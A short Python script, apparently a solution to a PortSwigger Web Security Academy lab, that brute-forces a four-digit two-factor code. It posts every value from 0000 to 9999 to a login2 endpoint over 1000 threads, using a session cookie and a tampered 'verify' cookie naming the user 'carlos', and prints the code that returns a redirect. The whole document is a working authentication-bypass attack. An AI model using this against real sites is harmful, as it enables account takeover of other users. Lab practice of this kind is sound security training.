import requests
from concurrent.futures import ThreadPoolExecutor

base_url = 'https://0a8400bf034cf9958078764300c60095.web-security-academy.net/'
login2_url = f'{base_url}login2'

cookies = {
    'session':'9qpUnwACxxpPWSQlErFUf1MEO4E1EcFz',
    'verify':'carlos'
}

def check_code(i):
    mfa_code = f'{i:04d}'
    data = {
        'mfa-code':mfa_code
        }
    try:
        response = requests.post(login2_url, data=data, cookies=cookies, allow_redirects=False)

        if response.status_code == 302:
            print(f'認証コードは{mfa_code}です。')

        if i % 100 == 0:
            print(f"試行中... {mfa_code}")

    except:
        pass

    return None


with ThreadPoolExecutor(max_workers=1000) as executor:
    executor.map(check_code, range(10000))